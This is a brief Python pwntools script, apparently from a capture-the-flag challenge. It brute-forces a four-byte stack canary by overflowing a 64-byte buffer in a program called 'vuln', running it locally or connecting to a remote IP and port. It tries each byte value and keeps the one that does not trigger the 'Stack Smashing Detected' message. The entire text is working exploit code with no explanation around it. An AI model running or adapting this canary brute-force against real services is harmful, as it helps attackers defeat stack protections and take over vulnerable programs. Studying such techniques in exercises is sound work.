from pwn import *

local = False

canary = ""
for j in range(0, 4):
  for i in range(0,256):
    if local:
      p = process('./vuln')
    else:
      p = remote("18.217.86.78", 52942)
    p.recvuntil(b'> ')
    count = f"{65 + len(canary)}\n"
    p.send(count.encode())
    p.recvuntil(b'Input> ')
    buf = "A"*(64) + canary + chr(i)
    p.send(buf.encode())
    res = p.recv()
    p.close()
    if b'Stack Smashing Detected' not in res:
      print(i)
      canary += chr(i)
      break
print(f"[*] Canary is: {canary}")